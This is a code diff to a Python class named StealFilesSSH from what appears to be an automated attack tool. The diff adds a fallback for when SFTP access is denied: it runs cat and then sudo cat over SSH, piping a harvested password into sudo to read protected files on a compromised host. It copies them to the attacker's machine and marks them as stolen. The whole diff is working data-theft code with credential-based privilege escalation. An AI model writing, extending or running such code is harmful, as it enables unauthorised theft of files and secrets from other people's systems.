@@ -7,6 +7,7 @@ import paramiko
 import logging
 import time
 import json
+import shlex
 from rich.console import Console
 from threading import Timer
 from shared import SharedData
@@ -162,12 +163,47 @@ class StealFilesSSH:
         logger.debug(f"Falling back to home directory guess: {fallback_home}")
         return fallback_home
 
-    def steal_file(self, ssh, remote_file, local_dir, ip):
+    def _download_with_privileged_cat(self, ssh, remote_file, local_file_path, password):
+        """Attempt to read remote files via shell (cat/sudo) when SFTP lacks rights."""
+        remote_quoted = shlex.quote(remote_file)
+        attempts = [(f"cat {remote_quoted}", False), (f"sudo -n cat {remote_quoted}", False)]
+
+        if password:
+            attempts.append((f"sudo -S cat {remote_quoted}", True))
+
+        for command, needs_password in attempts:
+            try:
+                stdin, stdout, stderr = ssh.exec_command(command, get_pty=needs_password)
+                if needs_password:
+                    stdin.write(f"{password}\n")
+                    stdin.flush()
+
+                data = stdout.read()
+                exit_status = stdout.channel.recv_exit_status()
+                error_output = stderr.read().decode().strip()
+
+                if exit_status == 0 and data:
+                    os.makedirs(os.path.dirname(local_file_path), exist_ok=True)
+                    with open(local_file_path, 'wb') as local_file:
+                        local_file.write(data)
+                    logger.info(f"Downloaded {remote_file} using shell command '{command}'")
+                    return True
+
+                logger.debug(
+                    f"Shell command '{command}' failed for {remote_file} (exit {exit_status}): {error_output or 'no stderr'}"
+                )
+            except Exception as fallback_error:
+                logger.debug(f"Shell fallback '{command}' errored for {remote_file}: {fallback_error}")
+
+        return False
+
+    def steal_file(self, ssh, remote_file, local_dir, ip, username=None, password=None):
         """
         Download a file from the remote server to the local directory.
         Includes size checking and progress logging.
         Optimization: Skip files that have already been downloaded.
         """
+        sftp = None
         try:
             # Check if file was already stolen
             if self.file_tracker.is_file_stolen(ip, remote_file):
@@ -197,19 +233,45 @@ class StealFilesSSH:
             os.makedirs(local_file_dir, exist_ok=True)
             local_file_path = os.path.join(local_file_dir, os.path.basename(remote_file))
             
-            # Download the file
-            sftp.get(remote_file, local_file_path)
-            logger.success(f"Downloaded {remote_file} -> {local_file_path}")
-            
-            # Mark file as stolen
-            self.file_tracker.mark_file_stolen(ip, remote_file)
-            
-            sftp.close()
-            return True
+            downloaded_via_sftp = False
+            fallback_required = False
+
+            try:
+                sftp.get(remote_file, local_file_path)
+                downloaded_via_sftp = True
+            except (PermissionError, OSError, IOError) as download_error:
+                if getattr(download_error, 'errno', None) == 13 or 'Permission denied' in str(download_error):
+                    fallback_required = True
+                    logger.warning(
+                        f"Permission denied fetching {remote_file} via SFTP. Attempting privileged fallback."
+                    )
+                else:
+                    raise
+
+            if sftp:
+                sftp.close()
+                sftp = None
+
+            if not downloaded_via_sftp and fallback_required:
+                downloaded_via_sftp = self._download_with_privileged_cat(
+                    ssh,
+                    remote_file,
+                    local_file_path,
+                    password
+                )
+                if not downloaded_via_sftp:
+                    logger.error(f"Fallback download also failed for {remote_file}")
+                    return False
+
+            if downloaded_via_sftp:
+                logger.success(f"Downloaded {remote_file} -> {local_file_path}")
+                self.file_tracker.mark_file_stolen(ip, remote_file)
+                return True
         except Exception as e:
             logger.error(f"Error stealing file {remote_file}: {e}")
             try:
-                sftp.close()
+                if sftp:
+                    sftp.close()
             except:
                 pass
             return False
@@ -311,7 +373,7 @@ class StealFilesSSH:
                                     logger.info("File download interrupted.")
                                     break
                                     
-                                if self.steal_file(ssh, remote_file, local_dir, ip):
+                                if self.steal_file(ssh, remote_file, local_dir, ip, username, password):
                                     downloaded_count += 1
                                     total_downloaded += 1
                                     
